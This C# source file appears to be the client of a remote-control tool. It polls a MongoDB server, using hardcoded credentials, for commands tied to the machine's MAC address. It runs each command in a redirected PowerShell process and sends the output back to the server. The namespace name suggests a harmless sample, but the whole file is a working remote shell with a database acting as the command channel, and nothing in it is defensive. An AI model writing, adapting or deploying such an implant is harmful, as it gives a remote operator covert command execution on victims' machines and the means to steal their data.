using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using MongoDB.Driver;
using MongoDB.Bson;
using System.Linq;

namespace ProcessAsyncStreamSamples
{
    class Powershell
    {
        // Define static variables shared by class methods.
        private static StringBuilder sendOutput = null;
        public static void CreatePowershellprocess(string databaseip, string databaseport, string mac)
        {
            while (true)
            {
                string inputText = client.infosender.Clientinfosender(mac, databaseip, databaseport);
                if (!String.IsNullOrEmpty(inputText))
                {
                    Process powershell = new Process();
                    powershell.StartInfo.FileName = "PowerShell.exe";
                    powershell.StartInfo.UseShellExecute = false;
                    powershell.StartInfo.RedirectStandardOutput = true;
                    sendOutput = new StringBuilder();
                    powershell.OutputDataReceived += SendOutputHandler;
                    powershell.StartInfo.RedirectStandardInput = true;
                    powershell.Start();
                    StreamWriter StreamWriter = powershell.StandardInput;
                    powershell.BeginOutputReadLine();
                    BsonDocument doc = new BsonDocument();
                    while (true)
                    {
                        Console.WriteLine(inputText);
                        doc.Add(new BsonElement("name", "client"));
                        doc.Add(new BsonElement("command", inputText));
                        sendOutput.Clear();
                        try
                        {
                            StreamWriter.WriteLine(inputText);

                        }
                        catch
                        {
                            var dbClient1 = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
                            ////create collection
                            IMongoDatabase respondsdatabase1 = dbClient1.GetDatabase("responds");
                            ////creat Mac object
                            var respondscollection1 = respondsdatabase1.GetCollection<BsonDocument>(mac);
                            doc.Add(new BsonElement("respond", "i cant run ur command!"));
                            respondsdatabase1.DropCollection(mac);
                            respondscollection1.InsertOne(doc);
                            doc.Clear();
                            StreamWriter.Close();
                            inputText = null;
                            powershell.Close();
                            break;
                        }
                        Thread.Sleep(10000);
                        if (String.IsNullOrEmpty(sendOutput.ToString()))
                        {
                            doc.Add(new BsonElement("respond", "ur command havent any output"));
                        }
                        else
                        {
                            using (StringReader reader = new StringReader(sendOutput.ToString()))
                            {
                                string line = string.Empty;
                                int i = 0;
                                do
                                {
                                    line = reader.ReadLine();
                                    if (line != null)
                                    {
                                        doc.Add(new BsonElement(i.ToString(), line));
                                        i++;
                                    }

                                } while (line != null);
                            }

                        }
                        var dbClient = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
                        IMongoDatabase respondsdatabase = dbClient.GetDatabase("responds");
                        var respondscollection = respondsdatabase.GetCollection<BsonDocument>(mac);
                        respondsdatabase.DropCollection(mac);
                        respondscollection.InsertOne(doc);
                        doc.Clear();
                        IMongoDatabase commandsdatabase = dbClient.GetDatabase("commands");
                        ////creat Mac object
                        var commadscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
                        var filter = Builders<BsonDocument>.Filter.Eq("name", "server");
                        var servercommand = commadscollection.Find(filter).FirstOrDefault();
                        try
                        {
                            inputText = servercommand.ElementAt(2).Value.ToString();
                            var update = Builders<BsonDocument>.Update.Set("command", "");
                            commadscollection.UpdateOne(filter, update);
                            if (inputText == "")
                            {
                                StreamWriter.Close();
                                powershell.Kill();
                                powershell.Close();
                                inputText = null;
                                break;
                            }
                        }
                        catch
                        {
                            StreamWriter.Close();
                            powershell.Close();
                            inputText = null;
                            break;
                        }

                    }

                }
            }
        }
        private static void SendOutputHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            // Collect the sort command output.
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                sendOutput.Append(Environment.NewLine +
                    $" {outLine.Data}");
            }
        }
    }
}